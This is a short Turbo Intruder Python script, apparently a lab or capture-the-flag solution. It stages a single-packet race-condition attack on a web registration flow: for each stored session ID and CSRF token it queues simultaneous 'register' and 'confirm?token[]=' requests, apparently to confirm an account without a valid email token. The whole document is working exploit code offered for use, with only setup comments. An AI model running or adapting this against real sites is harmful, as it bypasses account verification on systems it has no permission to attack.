def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds the final byte of each request until openGate is invoked
    for line in open('/home/mark/Downloads/sessions.txt'):
        data = line.split('\t')
        phpsessionid = data[6]
        csrf = data[7]
        username = randstr(8)
        engine.queue(target.req, ['register',       phpsessionid, csrf, username, username], gate='race1', learn=1)
        engine.queue(target.req, ['confirm?token[]=', phpsessionid, csrf, username, username], gate='race1', learn=2)

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')
    #engine.openGate('race2')


def handleResponse(req, interesting):
    table.add(req)

